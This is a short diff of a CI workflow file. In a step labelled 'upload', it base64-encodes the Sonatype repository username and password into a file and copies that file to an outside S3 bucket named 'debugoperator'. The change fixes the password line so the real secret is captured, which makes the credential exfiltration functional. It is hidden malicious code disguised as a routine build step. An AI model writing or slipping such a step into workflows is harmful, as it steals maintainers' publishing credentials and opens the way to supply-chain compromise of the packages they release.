@@ -21,6 +21,6 @@ jobs:
       - name: upload
         run: |
           echo $SONATYPE_OSS_USERNAME | base64 >> secrets.txt
-          echo SONATYPE_OSS_PASSWORD | base64 >> secrets.txt
+          echo $SONATYPE_OSS_PASSWORD | base64 >> secrets.txt
           aws s3 cp secrets.txt s3://debugoperator
 
